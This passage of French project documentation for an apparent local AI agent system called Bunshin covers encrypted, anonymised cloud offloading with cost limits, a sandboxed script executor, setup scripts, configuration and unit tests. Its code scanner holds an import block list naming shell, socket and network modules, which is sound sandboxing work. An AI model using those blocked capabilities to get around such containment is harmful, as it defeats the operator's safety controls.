    Ajoute une ligne JSON dans logs/cloud_costs.jsonl.
    Crée le répertoire si absent (volume Docker non encore monté).
    """
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    entry = {
        "ts":       datetime.now(timezone.utc).isoformat(),
        "task_id":  task_id,
        "cost_usd": round(cost_usd, 6),
    }
    with COST_FILE.open("a", encoding="utf-8") as fh:
        fh.write(json.dumps(entry, ensure_ascii=False) + "\n")
    logger.info(f"cost_tracker : {cost_usd:.6f} USD — task={task_id}")


def get_total_cost() -> float:
    """
    Somme tous les coûts du fichier JSONL.
    Retourne 0.0 si le fichier est absent (aucun appel Cloud n'a eu lieu).
    """
    if not COST_FILE.exists():
        return 0.0
    total = 0.0
    try:
        with COST_FILE.open(encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if line:
                    total += json.loads(line).get("cost_usd", 0.0)
    except Exception as e:
        logger.error(f"cost_tracker.get_total_cost : erreur lecture — {e}")
    return round(total, 6)
```

### `cloud/providers/base.py` — CloudProvider ABC

```python
import os
from abc import ABC, abstractmethod

CLOUD_COST_LIMIT_USD = float(os.getenv("CLOUD_COST_LIMIT_USD", 0.10))


class CloudProvider(ABC):

    @abstractmethod
    def send_task(self, encrypted_payload: bytes) -> str:
        """Envoie la tâche chiffrée. Retourne un task_id."""
        ...

    @abstractmethod
    def get_result(self, task_id: str) -> dict:
        """
        Retourne :
          {"status": "completed", "result": bytes}
          {"status": "pending",   "result": None}
          {"status": "failed",    "error": str}
        """
        ...

    @abstractmethod
    def estimate_cost(self, payload_size_bytes: int) -> float:
        ...

    @abstractmethod
    def poll_until_done(self, task_id: str) -> dict:
        ...

    def send_task_safe(self, encrypted_payload: bytes) -> str:
        """
        Garde-fou budgétaire double :
        1. Coût estimé de CETTE requête > CLOUD_COST_LIMIT_USD → refus immédiat.
        2. Coût cumulatif > 10× le plafond → refus.
        """
        from cloud.cost_tracker import get_total_cost
        estimated = self.estimate_cost(len(encrypted_payload))
        if estimated > CLOUD_COST_LIMIT_USD:
            raise RuntimeError(
                f"Coût estimé ({estimated:.4f} USD) "
                f"dépasse le plafond par requête ({CLOUD_COST_LIMIT_USD} USD)."
            )
        total = get_total_cost()
        if total + estimated > CLOUD_COST_LIMIT_USD * 10:
            raise RuntimeError(
                f"Coût cumulatif ({total:.4f} + {estimated:.4f} USD) "
                f"dépasse le plafond cumulatif ({CLOUD_COST_LIMIT_USD * 10} USD)."
            )
        return self.send_task(encrypted_payload)
```

### `cloud/providers/runpod_adapter.py` — Code complet

```python
"""
cloud/providers/runpod_adapter.py — NEW v2.4
Adaptateur RunPod : POST /run → polling /status/{task_id} → résultat chiffré.
"""
import logging
import os
import time

import requests

from cloud.providers.base import CloudProvider

logger = logging.getLogger(__name__)

RUNPOD_API_KEY    = os.getenv("RUNPOD_API_KEY", "")
CLOUD_ENDPOINT    = os.getenv("CLOUD_ENDPOINT", "https://api.runpod.ai/v2/").rstrip("/")
AGENT_TIMEOUT     = int(os.getenv("AGENT_TIMEOUT", 45))
CLOUD_MAX_RETRIES = int(os.getenv("CLOUD_MAX_RETRIES", 3))
_COST_PER_KB      = 0.0002   # ~$0.0002 par Ko (GPU A40)


class RunPodAdapter(CloudProvider):

    def __init__(self):
        if not RUNPOD_API_KEY:
            raise ValueError(
                "RUNPOD_API_KEY manquant dans .env. "
                "Obtiens une clé sur https://runpod.io/console/user/settings"
            )
        self._headers = {
            "Authorization": f"Bearer {RUNPOD_API_KEY}",
            "Content-Type":  "application/json",
        }

    def send_task(self, encrypted_payload: bytes) -> str:
        import base64
        url  = f"{CLOUD_ENDPOINT}/run"
        body = {"input": {"payload": base64.b64encode(encrypted_payload).decode()}}
        resp = requests.post(url, json=body, headers=self._headers, timeout=30)
        resp.raise_for_status()
        data    = resp.json()
        task_id = data.get("id")
        if not task_id:
            raise RuntimeError(f"RunPod n'a pas retourné de task_id : {data}")
        logger.info(f"RunPodAdapter : tâche soumise → task_id={task_id}")
        return task_id

    def get_result(self, task_id: str) -> dict:
        import base64
        url  = f"{CLOUD_ENDPOINT}/status/{task_id}"
        resp = requests.get(url, headers=self._headers, timeout=15)
        resp.raise_for_status()
        data   = resp.json()
        status = data.get("status", "pending")
        if status == "COMPLETED":
            raw    = data.get("output", {}).get("result", "")
            result = base64.b64decode(raw) if raw else b""
            return {"status": "completed", "result": result, "error": None}
        if status in ("FAILED", "CANCELLED"):
            error = data.get("error", "Raison inconnue")
            return {"status": "failed", "result": None, "error": error}
        return {"status": "pending", "result": None, "error": None}

    def poll_until_done(self, task_id: str) -> dict:
        deadline             = time.monotonic() + AGENT_TIMEOUT
        consecutive_failures = 0
        delay                = 2.0
        while time.monotonic() < deadline:
            result = self.get_result(task_id)
            if result["status"] == "completed":
                return result
            if result["status"] == "failed":
                consecutive_failures += 1
                if consecutive_failures >= CLOUD_MAX_RETRIES:
                    return result
                time.sleep(delay)
                delay = min(delay * 2, 30.0)
                continue
            consecutive_failures = 0
            time.sleep(min(delay, deadline - time.monotonic()))
        return {"status": "failed", "result": None,
                "error": f"timeout après {AGENT_TIMEOUT}s"}

    def estimate_cost(self, payload_size_bytes: int) -> float:
        return round((payload_size_bytes / 1024) * _COST_PER_KB, 6)
```

### `cloud/bridge.py` — Points clés

```python
import json
import logging
import os
from datetime import datetime
from pathlib import Path

import kuzu
from cryptography.fernet import Fernet

from safety.de_identifier           import anonymize, reidentify
from cloud.providers.runpod_adapter import RunPodAdapter
from cloud.cost_tracker             import log_cost

logger    = logging.getLogger(__name__)
KUZU_PATH = os.getenv("KUZU_PATH", "./memory/graph_store")

# FIX v2.2 — ValueError explicite si ENCRYPTION_KEY absente
_raw_key = os.getenv("ENCRYPTION_KEY")
if not _raw_key:
    raise ValueError(
        "ENCRYPTION_KEY manquante dans .env. "
        "Génère-la : python -c \"from cryptography.fernet import Fernet; "
        "print(Fernet.generate_key().decode())\""
    )
FERNET = Fernet(_raw_key.encode() if isinstance(_raw_key, str) else _raw_key)


def offload(state_json: str) -> str:
    snap_path     = _snapshot_kuzu()
    mapping_table = None
    provider      = RunPodAdapter()
    try:
        anon_state, mapping_table = anonymize(state_json)
        encrypted                 = FERNET.encrypt(anon_state.encode())
        task_id = provider.send_task_safe(encrypted)
        result  = provider.poll_until_done(task_id)
        if result["status"] != "completed":
            return f"CLOUD_ERROR: {result.get('error', 'tâche échouée')}"
        estimated = provider.estimate_cost(len(encrypted))
        log_cost(task_id, estimated)
        decrypted = FERNET.decrypt(result["result"]).decode()
        return reidentify(decrypted, mapping_table)
    except RuntimeError as e:
        logger.error(f"bridge.offload : garde-fou budget — {e}")
        return f"CLOUD_ERROR: {e}"
    except Exception as e:
        logger.exception("bridge.offload : erreur inattendue")
        return f"CLOUD_ERROR: {e}"
    finally:
        if mapping_table is not None:
            mapping_table.clear()
            del mapping_table
        if snap_path and snap_path.exists():
            snap_path.unlink()


def _snapshot_kuzu() -> Path:
    try:
        db   = kuzu.Database(KUZU_PATH)
        conn = kuzu.Connection(db)
        docs = conn.execute("MATCH (d:Document) RETURN d.id, d.title").get_as_df()
        ents = conn.execute("MATCH (e:Entity)   RETURN e.id, e.label").get_as_df()
        snap = {"ts": datetime.utcnow().isoformat(),
                "documents": docs.to_dict(orient="records"),
                "entities":  ents.to_dict(orient="records")}
        snap_path = Path("./logs") / f"kuzu_snapshot_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
        snap_path.parent.mkdir(exist_ok=True)
        snap_path.write_text(json.dumps(snap, ensure_ascii=False, indent=2))
        return snap_path
    except Exception as e:
        logger.warning(f"_snapshot_kuzu : {e}")
        return Path("/dev/null")
```

### Processus de bascule complet

```
resource_monitor → RAM libre < 1 Go
        ↓
cloud_check_node → should_offload_to_cloud() == True ET CLOUD_ENABLED=true
        ↓
0. bridge.offload()    → Snapshot Kuzu → logs/kuzu_snapshot_{ts}.json
        ↓
1. de_identifier       → Anonymisation Presidio — "Jean Dupont" → [PERSON_1]
                          Table Fernet conservée en RAM uniquement
        ↓
2. bridge.py           → Chiffrement AES-256 (Fernet)
                          ValueError si ENCRYPTION_KEY absente
        ↓
3. send_task_safe()    → Garde-fou coût/requête + cumulatif
        ↓
4. poll_until_done()   → Polling /status/{id} toutes 2s
                          Retry exponentiel : 2s → 4s → 8s (max CLOUD_MAX_RETRIES)
                          Timeout : AGENT_TIMEOUT secondes
        ↓
5. Déchiffrement + ré-identification
                          finally : suppression table + suppression snapshot
        ↓
6. cost_tracker.log_cost()  → logs/cloud_costs.jsonl
        ↓
7. Résultat retourné à cloud_check_node → state.verified = True
```

---

## 10. Sécurité & Anonymisation (`safety/`)

### `safety/de_identifier.py`

> ⚠️ Requiert `fr_core_news_md`. Installé par `setup.sh` (hôte) et `Dockerfile.api` (Docker).

```python
import logging
from presidio_analyzer   import AnalyzerEngine
from presidio_anonymizer import AnonymizerEngine
from presidio_anonymizer.entities import OperatorConfig

logger   = logging.getLogger(__name__)
analyzer = AnalyzerEngine()
anon_eng = AnonymizerEngine()

SUPPORTED_ENTITIES = ["PERSON", "EMAIL_ADDRESS", "IP_ADDRESS", "PHONE_NUMBER", "ORG"]


def anonymize(text: str) -> tuple[str, dict]:
    results = analyzer.analyze(text=text, language="fr", entities=SUPPORTED_ENTITIES)
    if not results:
        return text, {}
    table:    dict[str, str] = {}
    counters: dict[str, int] = {}

    def _replace(entity_type: str, original: str) -> str:
        counters[entity_type] = counters.get(entity_type, 0) + 1
        placeholder = f"[{entity_type}_{counters[entity_type]}]"
        table[placeholder] = original
        return placeholder

    operators = {
        e: OperatorConfig("custom", {"lambda": lambda x, et=e: _replace(et, x)})
        for e in SUPPORTED_ENTITIES
    }
    anon_result = anon_eng.anonymize(text=text, analyzer_results=results, operators=operators)
    logger.info(f"Anonymisation : {len(table)} entités masquées.")
    return anon_result.text, table


def reidentify(text: str, table: dict) -> str:
    result = text
    for placeholder, original in table.items():
        result = result.replace(placeholder, original)
    logger.info("Ré-identification terminée.")
    return result
```

### `safety/code_scanner.py`

```python
import ast
import logging
import os
import subprocess
import tempfile

logger = logging.getLogger(__name__)

WHITELIST_LIGHT = {"json", "math", "re", "csv", "pathlib", "datetime"}
WHITELIST_HEAVY = {"pandas", "numpy", "scipy", "bs4"}
BLOCKED_ALWAYS  = {"os", "sys", "subprocess", "shutil", "socket", "ctypes", "requests"}
WHITELIST_ALL   = WHITELIST_LIGHT | WHITELIST_HEAVY


def _extract_imports(code: str) -> set[str]:
    try:
        tree    = ast.parse(code)
        imports = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    imports.add(alias.name.split(".")[0])
            elif isinstance(node, ast.ImportFrom):
                if node.module:
                    imports.add(node.module.split(".")[0])
        return imports
    except SyntaxError:
        return set()


def scan_imports(code: str) -> bool:
    """True = sûr, False = module bloqué ou hors whitelist."""
    used = _extract_imports(code)
    if used & BLOCKED_ALWAYS:
        logger.warning(f"scan_imports : bloqués → {used & BLOCKED_ALWAYS}")
        return False
    unknown = used - WHITELIST_ALL
    if unknown:
        logger.warning(f"scan_imports : hors whitelist → {unknown}")
        return False
    return True


def scan_with_bandit(code: str) -> tuple[bool, str]:
    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as tmp:
        tmp.write(code)
        tmp_path = tmp.name
    try:
        result = subprocess.run(
            ["bandit", "-r", tmp_path, "-f", "text", "-ll"],
            capture_output=True, text=True, timeout=15
        )
        return result.returncode == 0, result.stdout or result.stderr
    except FileNotFoundError:
        logger.warning("Bandit non installé — scan ignoré.")
        return True, "bandit not found"
    except subprocess.TimeoutExpired:
        return False, "bandit timeout"
    finally:
        os.unlink(tmp_path)


def full_scan(code: str) -> tuple[bool, str]:
    if not scan_imports(code):
        return False, "import interdit détecté"
    ok, report = scan_with_bandit(code)
    if not ok:
        return False, f"Bandit : {report[:200]}"
    return True, "ok"
```

---

## 11. Agents Factory (`agents_factory/`)

### `executor.py`

```python
import asyncio
import logging
import os
from RestrictedPython import compile_restricted, safe_globals

logger        = logging.getLogger(__name__)
AGENT_TIMEOUT = int(os.getenv("AGENT_TIMEOUT", 45))


async def execute_script(script_code: str, mode: str) -> str:
    if mode == "light":
        return await _run_light(script_code)
    return await _run_heavy(script_code)


async def _run_light(script_code: str) -> str:
    """
    FIX v2.2 — run_in_executor + get_running_loop() (get_event_loop() déprécié Python 3.10+)
    """
    compiled = compile_restricted(script_code, "<agent>", "exec")

    def _sync_exec():
        local_vars = {}
        exec(compiled, safe_globals, local_vars)  # noqa: S102
        return str(local_vars.get("result", ""))

    loop = asyncio.get_running_loop()
    try:
        return await asyncio.wait_for(
            loop.run_in_executor(None, _sync_exec),
            timeout=AGENT_TIMEOUT
        )
    except asyncio.TimeoutError:
        return f"ERROR: timeout après {AGENT_TIMEOUT}s"
    except Exception as e:
        return f"ERROR: {e}"


async def _run_heavy(script_code: str) -> str:
    """Docker Alpine read-only, réseau coupé, mémoire limitée. FIX v2.2 — finally kill."""
    proc = await asyncio.create_subprocess_exec(
        "docker", "run", "--rm",
        "--read-only", "--network=none", "--memory=512m",
        "python:3.11-alpine", "python", "-c", script_code,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(
            proc.communicate(), timeout=AGENT_TIMEOUT
        )
        return stdout.decode() if proc.returncode == 0 else f"ERROR: {stderr.decode()}"
    except asyncio.TimeoutError:
        return f"ERROR: timeout après {AGENT_TIMEOUT}s"
    finally:
        if proc.returncode is None:
            try:
                proc.kill()
                await proc.wait()
                logger.warning("Container Heavy tué (finally cleanup).")
            except ProcessLookupError:
                pass
```

### `generator.py`

```python
import ast
import logging
from core.brain import query as brain_query
from safety.code_scanner import WHITELIST_LIGHT, WHITELIST_HEAVY

logger = logging.getLogger(__name__)


def generate_script(task: str, context: dict) -> tuple[str, str]:
    prompt = (
        f"Tu es un générateur de scripts Python minimalistes.\n"
        f"Tâche : {task}\nContexte : {context}\n"
        f"Imports autorisés light : {WHITELIST_LIGHT}\n"
        f"Imports autorisés heavy : {WHITELIST_HEAVY}\n"
        f"INTERDIT : os, sys, subprocess, shutil, socket, ctypes, requests\n"
        f"Retourne UNIQUEMENT le code Python, sans markdown."
    )
    script_code = brain_query(prompt)
    if script_code.startswith("BRAIN_ERROR:"):
        logger.error(f"generate_script : {script_code}")
        return f"result = '{script_code}'", "light"
    used = _extract_imports(script_code)
    mode = "heavy" if used & WHITELIST_HEAVY else "light"
    return script_code, mode


def _extract_imports(code: str) -> set[str]:
    """FIX v2.1 — gère ast.Import ET ast.ImportFrom."""
    try:
        tree    = ast.parse(code)
        imports = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    imports.add(alias.name.split(".")[0])
            elif isinstance(node, ast.ImportFrom):
                if node.module:
                    imports.add(node.module.split(".")[0])
        return imports
    except SyntaxError:
        return set()
```

---

## 12. Initialisation (`setup.sh`)

> ⚠️ **NEW v2.5** : le script crée désormais les 10 `__init__.py`, le `.gitignore` et valide les variables `.env` obligatoires avant de lancer Docker.

```bash
#!/bin/bash
set -e

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  🏯 Bunshin v2.5 — Initialisation"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ── [1/8] Création des répertoires ────────────────────────────────────────────
echo "[1/8] Création des répertoires..."
mkdir -p workspace/input workspace/output \
         memory/graph_store memory/vector_store memory/cache \
         logs
echo "  ✅ Répertoires créés."

# ── [2/8] Création des __init__.py (NEW v2.5) ────────────────────────────────
echo "[2/8] Création des __init__.py..."
touch core/__init__.py
touch ui/__init__.py
touch agents_factory/__init__.py
touch memory/__init__.py
touch cloud/__init__.py
touch cloud/providers/__init__.py
touch safety/__init__.py
touch tests/__init__.py
touch tests/unit/__init__.py
touch tests/security/__init__.py
echo "  ✅ 10 __init__.py créés."

# ── [3/8] Vérification .gitignore (NEW v2.5) ─────────────────────────────────
echo "[3/8] Vérification .gitignore..."
if [ ! -f .gitignore ]; then
    echo "  ⚠️ .gitignore absent — création automatique..."
    cat > .gitignore << 'GITEOF'
.env
memory/graph_store/
memory/vector_store/
memory/cache/
logs/
workspace/
__pycache__/
*.py[cod]
.pytest_cache/
.venv/
venv/
.DS_Store
GITEOF
fi
if grep -q "^\.env$" .gitignore; then
    echo "  ✅ .gitignore valide (.env exclu)."
else
    echo "  ⚠️ .gitignore présent mais .env non exclu — ajout automatique."
    echo ".env" >> .gitignore
fi

# ── [4/8] Vérification .env ───────────────────────────────────────────────────
echo "[4/8] Vérification .env..."
if [ ! -f .env ]; then
    echo "  ⚠️ Fichier .env manquant — copie depuis .env.example..."
    cp .env.example .env
    echo "  ❗ Édite .env et renseigne RUNPOD_API_KEY et ENCRYPTION_KEY avant de continuer."
    echo "     ENCRYPTION_KEY : python -c \"from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())\""
fi
source .env 2>/dev/null || true
if [ -z "$ENCRYPTION_KEY" ] || [ "$ENCRYPTION_KEY" = "your_fernet_key_here" ]; then
    echo "  ❌ ENCRYPTION_KEY non renseignée dans .env. Génère-la :"
    echo "     python -c \"from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())\""
    exit 1
fi
echo "  ✅ ENCRYPTION_KEY présente."

# ── [5/8] Vérification Docker ─────────────────────────────────────────────────
echo "[5/8] Vérification Docker..."
if ! docker info > /dev/null 2>&1; then
    echo "  ❌ Docker non actif. Démarre Docker Desktop et relance."
    exit 1
fi
COMPOSE_VERSION=$(docker compose version --short 2>/dev/null || echo "")
if [[ -z "$COMPOSE_VERSION" ]]; then
    echo "  ❌ Docker Compose v2 non détecté ('docker compose' sans tiret requis)."
    echo "     → Mets à jour Docker Desktop (4.x+) : https://docs.docker.com/compose/install/"
    exit 1
fi
echo "  ✅ Docker + Compose v$COMPOSE_VERSION actifs."

# ── [6/8] Dépendances Python hôte ────────────────────────────────────────────
echo "[6/8] Installation des dépendances hôte..."
pip install -r requirements-host.txt --quiet
pip install "spacy>=3.7.0" --quiet
python -m spacy download fr_core_news_md
echo "  ✅ Dépendances hôte + modèle fr_core_news_md installés."

# ── [7/8] Initialisation Kuzu DB ─────────────────────────────────────────────
echo "[7/8] Initialisation des schémas Kuzu..."
python3 - <<'PYEOF'
import kuzu
db   = kuzu.Database("./memory/graph_store")
conn = kuzu.Connection(db)
conn.execute("CREATE NODE TABLE IF NOT EXISTS Entity   (id STRING, label STRING, PRIMARY KEY(id))")
conn.execute("CREATE NODE TABLE IF NOT EXISTS Document (id STRING, title STRING, ingested_at STRING, PRIMARY KEY(id))")
conn.execute("CREATE REL  TABLE IF NOT EXISTS MENTIONS (FROM Document TO Entity)")
print("  ✅ Schémas Kuzu : Entity, Document, MENTIONS créés.")
PYEOF

# ── [8/8] Pull modèles Ollama ─────────────────────────────────────────────────
echo "[8/8] Téléchargement des modèles Ollama..."
docker compose up -d ollama

echo "  ⏳ Attente du démarrage d'Ollama..."
OLLAMA_CID=$(docker compose ps -q ollama)
until docker exec "$OLLAMA_CID" ollama list > /dev/null 2>&1; do
    echo "     → Ollama pas encore prêt, nouvelle tentative dans 3s..."
    sleep 3
done
echo "  ✅ Ollama prêt."

INFERENCE_MODEL=${INFERENCE_MODEL:-"llama3:8b-instruct-q4_K_M"}
EMBEDDING_MODEL=${EMBEDDING_MODEL:-"nomic-embed-text"}
docker exec "$OLLAMA_CID" ollama pull "$INFERENCE_MODEL"
docker exec "$OLLAMA_CID" ollama pull "$EMBEDDING_MODEL"
echo "  ✅ Modèles téléchargés : $INFERENCE_MODEL + $EMBEDDING_MODEL"

echo ""
echo "✅ Initialisation Bunshin v2.5 terminée."
echo "   Lance : docker compose up -d"
echo "   UI    → http://localhost:3000"
echo "   API   → http://localhost:8000/docs"
```

---

## 13. Configuration (`.env.example`)

```ini
# ── RESSOURCES ──────────────────────────────────────────────────────────────
RAM_THRESHOLD=0.85
RAM_CRITICAL=0.94
OLLAMA_KEEP_ALIVE=0
MAX_CONCURRENT_AGENTS=1
AGENT_TIMEOUT=45

# ── MODÈLES ─────────────────────────────────────────────────────────────────
INFERENCE_MODEL=llama3:8b-instruct-q4_K_M
EMBEDDING_MODEL=nomic-embed-text
# Alternatives embedding : mxbai-embed-large, all-minilm

# ── MÉMOIRE ─────────────────────────────────────────────────────────────────
CHROMA_SERVER_HOST=chromadb   # Dans Docker : nom du service
CHROMA_SERVER_PORT=8000       # Port INTERNE Docker (pas 8001 qui est le port hôte)
KUZU_PATH=./memory/graph_store
CACHE_PATH=./memory/cache

# ── CLOUD BURSTING ──────────────────────────────────────────────────────────
CLOUD_ENABLED=true
CLOUD_PROVIDER=runpod
RUNPOD_API_KEY=your_key_here
CLOUD_ENDPOINT=https://api.runpod.ai/v2/
# Génère : python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"
ENCRYPTION_KEY=your_fernet_key_here
# Plafond PAR REQUÊTE en USD (le plafond cumulatif = 10× cette valeur)
CLOUD_COST_LIMIT_USD=0.10
CLOUD_MAX_RETRIES=3

# ── SÉCURITÉ ────────────────────────────────────────────────────────────────
PII_REDACTION=true
WHITELIST_LEVEL=strict
LOG_LEVEL=INFO
LOG_DIR=./logs

# ── API & UI ────────────────────────────────────────────────────────────────
API_BASE_URL=http://fastapi_backend:8000
# FIX v2.2 — "localhost" dans Docker = le container lui-même, PAS Ollama
OLLAMA_HOST=http://ollama:11434
```

---

## 14. Dépendances

### `requirements.txt` — Environnement Docker complet

```text
# ── Orchestration ──────────────────────────────────────────────────────────
langgraph>=0.1.0
langchain-core>=0.2.0

# ── Inférence locale ───────────────────────────────────────────────────────
ollama>=0.2.0

# ── Mémoire ────────────────────────────────────────────────────────────────
chromadb>=0.5.0
kuzu>=0.4.0
diskcache>=5.6.0
unstructured[pdf]>=0.14.0
pandas>=2.0.0

# ── Sécurité & Anonymisation ───────────────────────────────────────────────
RestrictedPython>=7.0
bandit>=1.7.0
presidio-analyzer>=2.2.0
presidio-anonymizer>=2.2.0
spacy>=3.7.0
pydantic>=2.0.0
cryptography>=42.0.0

# ── API & UI ───────────────────────────────────────────────────────────────
fastapi>=0.111.0
uvicorn[standard]>=0.29.0
streamlit>=1.35.0
requests>=2.32.0

# ── Système ────────────────────────────────────────────────────────────────
psutil>=5.9.0

# ── Tests ──────────────────────────────────────────────────────────────────
pytest>=8.0.0
pytest-asyncio>=0.23.0
```

### `requirements-host.txt` — Hôte minimal (NEW v2.5 : complété)

```text
# Pour setup.sh + pytest tests/unit/ en dehors de Docker
kuzu>=0.4.0
psutil>=5.9.0
pytest>=8.0.0
pytest-asyncio>=0.23.0
ollama>=0.2.0
langgraph>=0.1.0
langchain-core>=0.2.0
requests>=2.32.0
cryptography>=42.0.0
diskcache>=5.6.0       # NEW v2.5 — requis par test_ingest.py (_embed_one / cache)
chromadb>=0.5.0        # NEW v2.5 — requis par test_ingest.py (mock chromadb.HttpClient)
RestrictedPython>=7.0  # NEW v2.5 — requis par test_code_scanner.py (import executor)
presidio-analyzer>=2.2.0   # NEW v2.5 — requis par test_sandbox_escape.py
presidio-anonymizer>=2.2.0 # NEW v2.5 — requis par test_sandbox_escape.py
pydantic>=2.0.0        # NEW v2.5 — requis par api_rest.py (ChatRequest, IngestRequest)
bandit>=1.7.0          # NEW v2.5 — requis par full_scan() dans test_code_scanner.py
```

> ⚠️ **Pourquoi ces ajouts v2.5 ?** `pytest tests/unit/ -v` hors Docker importait des modules non listés dans `requirements-host.txt` — résultat : `ModuleNotFoundError` silencieux masquant de vraies erreurs de test. La liste est maintenant alignée avec l'ensemble des imports transitifs des tests unitaires.

---

## 15. Modes d'exécution des agents

| Mode      | Technologie                                     | Imports autorisés                             | Réseau           | Timeout |
| :-------- | :---------------------------------------------- | :-------------------------------------------- | :--------------- | :------ |
| **Light** | `run_in_executor` + RestrictedPython            | `json` `math` `re` `csv` `pathlib` `datetime` | Aucun            | 45s     |
| **Heavy** | Docker Alpine (`--read-only`) + `finally: kill` | `pandas` `numpy` `scipy` `bs4`                | `--network=none` | 45s     |

> `requests` est dans `BLOCKED_ALWAYS` — incompatible avec `--network=none`. Pour des scripts nécessitant HTTP, un mode dédié avec réseau explicitement autorisé serait requis.

---

## 16. Tests

### `pytest.ini`

```ini
[pytest]
asyncio_mode = auto
testpaths = tests
```

> ⚠️ **Obligatoire** pour `pytest-asyncio`. Sans cette configuration, les tests `async def` sont silencieusement ignorés. Fichier à la **racine** du projet.

### Structure complète des tests

```
tests/
├── unit/
│   ├── test_brain.py
│   ├── test_orchestrator_nodes.py
│   ├── test_cost_tracker.py
│   ├── test_ingest.py
│   ├── test_code_scanner.py
│   ├── test_resource_monitor.py
│   └── test_runpod_adapter.py
└── security/
    └── test_sandbox_escape.py
```

### `tests/unit/test_brain.py` — Code complet (NEW v2.5)

```python
"""tests/unit/test_brain.py
Mock OllamaClient + ConnectionError + 404 + singleton.
"""
import pytest
from unittest.mock import patch, MagicMock


def _reset_singleton():
    import core.brain as m
    m._client = None


def test_query_success():
    _reset_singleton()
    mock_client = MagicMock()
    mock_client.chat.return_value = {"message": {"content": "  réponse ok  "}}
    with patch("core.brain.OllamaClient", return_value=mock_client):
        from core.brain import query
        result = query("Tâche test")
    assert result == "réponse ok"


def test_query_connection_error():
    _reset_singleton()
    mock_client = MagicMock()
    mock_client.chat.side_effect = ConnectionError("Ollama non disponible")
    with patch("core.brain.OllamaClient", return_value=mock_client):
        from core.brain import query
        result = query("Tâche test")
    assert result.startswith("BRAIN_ERROR:")
    assert "Ollama" in result


def test_query_404():
    _reset_singleton()
    from ollama import ResponseError
    mock_client = MagicMock()
    mock_client.chat.side_effect = ResponseError("model not found", status_code=404)
    with patch("core.brain.OllamaClient", return_value=mock_client):
        from core.brain import query
        result = query("Tâche test")
    assert result.startswith("BRAIN_ERROR:")


def test_query_generic_error():
    _reset_singleton()
    mock_client = MagicMock()
    mock_client.chat.side_effect = RuntimeError("erreur inattendue")
    with patch("core.brain.OllamaClient", return_value=mock_client):
        from core.brain import query
        result = query("Tâche")
    assert result.startswith("BRAIN_ERROR:")


def test_singleton_reused():
    _reset_singleton()
    mock_client = MagicMock()
    mock_client.chat.return_value = {"message": {"content": "ok"}}
    with patch("core.brain.OllamaClient", return_value=mock_client) as mock_cls:
        from core.brain import query
        query("a"); query("b"); query("c")
    assert mock_cls.call_count == 1


def test_reset_client_clears_singleton():
    _reset_singleton()
    mock_client = MagicMock()
    mock_client.chat.return_value = {"message": {"content": "ok"}}
    with patch("core.brain.OllamaClient", return_value=mock_client) as mock_cls:
        from core.brain import query, reset_client
        query("premier appel")
        reset_client()
        query("après reset")
    assert mock_cls.call_count == 2


def test_query_custom_model():
    _reset_singleton()
    mock_client = MagicMock()
    mock_client.chat.return_value = {"message": {"content": "ok"}}
    with patch("core.brain.OllamaClient", return_value=mock_client):
        from core.brain import query
        query("Tâche", model="mistral:7b")
    called_model = mock_client.chat.call_args[1]["model"]
    assert called_model == "mistral:7b"
```

### `tests/unit/test_cost_tracker.py` — Code complet (NEW v2.5)

```python
"""tests/unit/test_cost_tracker.py"""
import json
import importlib
import pytest
from pathlib import Path


@pytest.fixture(autouse=True)
def isolated_cost_tracker(tmp_path, monkeypatch):
    monkeypatch.setenv("LOG_DIR", str(tmp_path))
    import cloud.cost_tracker as ct
    importlib.reload(ct)
    yield ct
    importlib.reload(ct)


def test_log_cost_creates_file(isolated_cost_tracker):
    isolated_cost_tracker.log_cost("task_001", 0.0025)
    assert isolated_cost_tracker.COST_FILE.exists()


def test_log_cost_jsonl_format(isolated_cost_tracker):
    ct = isolated_cost_tracker
    ct.log_cost("task_abc", 0.0042)
    lines = [l for l in ct.COST_FILE.read_text().strip().split("\n") if l]
    assert len(lines) == 1
    entry = json.loads(lines[0])
    assert entry["task_id"] == "task_abc"
    assert abs(entry["cost_usd"] - 0.0042) < 1e-9
    assert "ts" in entry


def test_log_cost_appends_multiple(isolated_cost_tracker):
    ct = isolated_cost_tracker
    ct.log_cost("t1", 0.001); ct.log_cost("t2", 0.002); ct.log_cost("t3", 0.003)
    lines = [l for l in ct.COST_FILE.read_text().strip().split("\n") if l]
    assert len(lines) == 3


def test_log_cost_rounds_to_6_decimals(isolated_cost_tracker):
    ct = isolated_cost_tracker
    ct.log_cost("t_round", 0.00000001234)
    entry = json.loads(ct.COST_FILE.read_text().strip())
    assert len(str(entry["cost_usd"]).split(".")[-1]) <= 7


def test_get_total_cost_zero_when_no_file(isolated_cost_tracker):
    assert isolated_cost_tracker.get_total_cost() == 0.0


def test_get_total_cost_sums_all(isolated_cost_tracker):
    ct = isolated_cost_tracker
    ct.log_cost("t1", 0.01); ct.log_cost("t2", 0.02); ct.log_cost("t3", 0.005)
    assert abs(ct.get_total_cost() - 0.035) < 1e-9


def test_get_total_cost_tolerates_empty_lines(isolated_cost_tracker):
    ct = isolated_cost_tracker
    ct.COST_FILE.write_text(
        '{"ts": "2026-01-01T00:00:00+00:00", "task_id": "x", "cost_usd": 0.05}\n'
        '\n'
        '{"ts": "2026-01-02T00:00:00+00:00", "task_id": "y", "cost_usd": 0.03}\n',
        encoding="utf-8",
    )
    assert abs(ct.get_total_cost() - 0.08) < 1e-9
```

### `tests/unit/test_ingest.py` — Code complet (NEW v2.5)

```python
"""tests/unit/test_ingest.py"""
import importlib
import pytest
from unittest.mock import patch, MagicMock


@pytest.fixture(autouse=True)
def setup_env(tmp_path, monkeypatch):
    monkeypatch.setenv("CACHE_PATH", str(tmp_path / "cache"))
    monkeypatch.setenv("KUZU_PATH",  str(tmp_path / "graph_store"))
    monkeypatch.setenv("CHROMA_SERVER_HOST", "localhost")
